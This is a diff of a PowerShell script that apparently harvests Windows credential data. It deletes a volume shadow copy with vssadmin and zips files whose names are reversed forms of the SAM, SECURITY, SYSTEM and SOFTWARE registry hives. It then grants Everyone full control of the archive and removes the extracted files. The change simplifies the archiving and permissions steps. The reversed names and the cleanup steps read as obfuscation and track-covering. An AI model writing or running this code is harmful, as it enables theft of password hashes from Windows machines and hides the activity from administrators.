@@ -39,46 +39,17 @@ rm $mali
 Write-Output "[-] Deleting shadow copy"
 vssadmin delete shadows /Shadow="$ghostID" /Quiet > $null 2>&1
 
-$filesToZip = @(
-    "$store\${stampa}_mas",
-    "$store\${stampa}_ytiruces",
-    "$store\${stampa}_metsys",
-    "$store\${stampa}_erawtfos"
-)
+# Compress files into a ZIP archive
+Write-Output "[+] Creating ZIP archive: $zinxho"
+Compress-Archive -Path "$store\${stampa}_mas", "$store\${stampa}_ytiruces", "$store\${stampa}_metsys", "$store\${stampa}_erawtfos" -DestinationPath $zinxho
 
-Write-Output "[+] Creating ZIP archive using .NET"
-Add-Type -AssemblyName System.IO.Compression.FileSystem
-$zip = [System.IO.Compression.ZipFile]::Open($zinxho, 'Create')
-
-foreach ($file in $filesToZip) {
-    if (Test-Path $file) {
-        Write-Output "[+] Adding $file to archive"
-        [System.IO.Compression.ZipFile]::CreateFromDirectory($file, $zip, [System.IO.Compression.CompressionLevel]::Optimal, $true)
-    } else {
-        Write-Output "[-] File $file not found, skipping"
-    }
-}
-$zip.Dispose()
-
-#
 # Modify permissions to make the ZIP file readable by everyone using icacls
-#Write-Output "[+] Modifying ZIP file permissions using icacls"
-#$icaclsCommand = "icacls `"$zinxho`" /grant Everyone:F /T"
-#Invoke-Expression $icaclsCommand
-
-# Modify permissions to make the ZIP file readable by everyone
-Write-Output "[+] Modifying ZIP file permissions"
-$acl = Get-Acl $zinxho
-$accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "FullControl", "Allow")
-$acl.SetAccessRule($accessRule)
-Set-Acl -Path $zinxho -AclObject $acl
+Write-Output "[+] Modifying ZIP file permissions using icacls"
+$icaclsCommand = "icacls `"$zinxho`" /grant Everyone:F /T"
+Invoke-Expression $icaclsCommand
 
 # Remove original files
 Write-Output "[-] Removing extracted files"
-foreach ($file in $filesToZip) {
-    if (Test-Path $file) {
-        Remove-Item $file -Force
-    }
-}
+Remove-Item "$store\${stampa}_mas", "$store\${stampa}_ytiruces", "$store\${stampa}_metsys", "$store\${stampa}_erawtfos" -Force
 
 Write-Output "[+] Operation completed. Archive saved at $zinxho"
